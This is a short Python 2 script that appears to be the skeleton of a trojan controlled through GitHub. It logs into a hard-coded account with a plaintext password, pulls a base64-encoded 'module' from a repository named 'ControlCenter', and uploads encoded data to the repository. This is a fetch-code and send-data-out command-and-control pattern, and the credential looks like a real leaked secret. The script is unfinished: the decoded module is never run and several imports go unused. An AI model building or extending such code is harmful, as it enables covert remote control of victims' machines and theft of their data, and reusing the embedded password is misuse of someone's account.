import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login


def connect_to_github():
    gh=login(username="HejunweiCoder",password="hjw3269982")
    repo=gh.repository("HejunweiCoder","ControlCenter")
    branch=repo.branch("master")

    return gh,repo,branch


def get_file_contents(filepath):
    gh,repo,branch=connect_to_github()
    tree=branch.commit.commit.tree.recurse()

    for filename in tree.tree:

        if filepath in filename.path:
            print "[*] Found file %s "% filepath
            blob=repo.blob(filename._json_data["sha"])
            return blob.content

def store_module_result(data):

    gh,repo,branch=connect_to_github()
    remote_path = "data/test.data"
    repo.create_file(remote_path,"Commite message",base64.b64encode(data))
    print "upload success"
    return

base64.b64decode(get_file_contents('module'))
